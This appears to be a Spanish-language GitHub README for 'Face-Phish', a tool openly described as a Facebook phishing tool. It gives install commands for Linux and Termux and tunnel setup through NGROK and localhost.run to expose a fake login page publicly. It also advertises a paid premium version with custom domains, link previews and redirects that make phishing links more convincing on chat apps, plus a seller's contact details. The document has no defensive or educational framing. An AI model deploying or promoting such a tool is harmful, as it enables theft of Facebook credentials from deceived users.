# Face-Phish
Social for Phishing Facebook [ version free ]

* Herramienta Phishing para Facebook.

# Screenshots
<p align="center">
 <img src="https://user-images.githubusercontent.com/76820660/156854597-6e4dd11b-972d-4e59-8b3b-5870e1c0bca9.png"></img>
 </p>

# Requisitos 

* `NGROK`
* `php`
* `openssh`
* `git`
* `proot`
* `resolv-conf` [ solo en Termux ]

# Probado en:

* `Kali Linux`
* `Paroot OS`
* `Linux Mint`
* `Termux` (Android)

# Tunnel

### Cuenta con dos tuneles :

* `NGROK`
* `SSH.LOCALHOST.RUN`

### Cuenta con el enlace acortado.

# 🔰Pasos para usar el servidor ssh.localhost.run en Face-Phish (Configuración del servidor localhost.run)🔰

Para empezar a usar el servidor ssh.localhost.run , que esta incluido en la herramienta Face-Phish V1.4

Es necesario configurar y seguir estos pasos:

* ejecutar :

$ pkg install openssh -y

$ ssh-keygen -t rsa

* Una vez ejecutado ssh-keygen -t rsa , solo seguiremos presionando enter hasta que termine.

* Siguiente es en usar el servidor manualmente

$ ssh -R 80:localhost:8080 nokey@localhost.run

* Una vez ejecutado nos va a realizar una pregunta y le responderemos añadiendo : yes

Por lo cual empezará a iniciar el servidor ,  ahora debemos presionar : CTRL + c 
Para salir del servidor que se esta ejecutando .

Una vez hecho y realizado correctamente esos pasos ya esta listo para poder usar la Herramienta Face-Phish con el servidor ssh.localhost.run.

# Instalacion en Linux

$ sudo apt-get update

$ sudo apt-get upgrade -y

$ sudo apt-get install php git -y 

$ sudo apt-get install wget -y

$ sudo apt-get install proot -y

$ sudo apt-get install ssh -y

$ cd $HOME

$ git clone https://github.com/edgarluck/Face-Phish.git

$ cd Face-Phish

$ bash face-phish.sh

# Instalacion en Termux

$ apt update && apt upgrade -y

$ pkg install proot resolv-conf -y

$ pkg install php -y

$ pkg install wget -y 

$ pkg install git -y

$ pkg install openssh -y

$ cd $HOME

$ git clone https://github.com/edgarluck/Face-Phish.git

$ cd Face-Phish

$ chmod +x face-phish.sh

$ bash face-phish.sh

# Telegram --> https://t.me/Linux_Informatic

### La version Premiun incluye soporte , mas personalización y ayuda en los errores que presentas.
 
* Agregar una imagen al enlace.
  
  `La imagen es visible en las siguientes redes sociales ( Chat ): WhatsApp , Facebook , Telegram.`
* Agregar un Titulo.
* Agregar una descripción.
* Agregar un dominio.
* Agregar un redireccionamiento de pagina.
* Personalizar el enlace.

### Contactame si desea adquirirlo a un precio accesible: 
* https://t.me/edgarluck
* `+51 938454671`
